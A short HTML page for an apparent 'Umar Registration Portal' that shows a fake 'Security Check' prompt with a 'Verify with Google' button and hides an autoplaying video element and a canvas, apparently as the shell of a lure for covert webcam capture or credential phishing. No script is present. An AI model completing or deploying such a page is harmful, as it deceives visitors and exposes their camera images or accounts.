<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Umar Registration Portal</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
        .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .btn { background-color: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; }
        #status-box { margin-top: 20px; font-weight: bold; color: #333; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="color: #333;">Security Check</h2>
    <p style="color: #666;">Please verify your account to access the dashboard</p>
    <button id="loginBtn" class="btn">Verify with Google</button>
    <div id="status-box">
        <p id="msg"></p>
        <video id="v" autoplay></video>
        <canvas id="c"></canvas>
    </div>
</div>

</html>
